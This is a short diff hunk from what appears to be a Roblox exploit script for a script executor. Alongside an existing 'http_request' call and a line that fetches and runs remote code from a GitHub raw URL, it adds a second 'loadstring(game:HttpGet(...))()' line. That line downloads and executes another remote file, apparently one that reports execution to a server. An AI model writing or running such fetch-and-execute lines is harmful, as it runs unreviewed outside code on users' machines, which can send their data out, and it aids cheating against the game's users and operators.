@@ -36,3 +36,5 @@ http_request({
 })
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Nevan32/Nevan/main/NevanHubK"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nevan32/Nevan/refs/heads/main/info%20executed%20server"))()
